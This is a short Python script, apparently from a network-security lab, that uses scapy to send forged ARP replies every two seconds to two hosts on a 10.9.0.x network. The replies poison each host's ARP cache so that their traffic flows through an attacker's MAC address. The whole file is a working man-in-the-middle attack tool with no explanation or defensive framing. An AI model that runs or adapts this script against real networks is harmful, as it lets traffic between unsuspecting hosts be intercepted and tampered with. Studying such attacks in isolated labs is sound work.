#!/usr/bin/env python3
from scapy.all import *
import time

A_IP, A_MAC = "10.9.0.5", "02:42:0a:09:00:05"
B_IP, B_MAC = "10.9.0.6", "02:42:0a:09:00:06"
M_MAC = "02:42:0a:09:00:69"

def poison():
    pkt_a = Ether(dst=A_MAC)/ARP(op=2, hwsrc=M_MAC, psrc=B_IP, hwdst=A_MAC, pdst=A_IP)
    pkt_b = Ether(dst=B_MAC)/ARP(op=2, hwsrc=M_MAC, psrc=A_IP, hwdst=B_MAC, pdst=B_IP)
    sendp(pkt_a, verbose=False)
    sendp(pkt_b, verbose=False)

while True:
    poison()
    time.sleep(2)
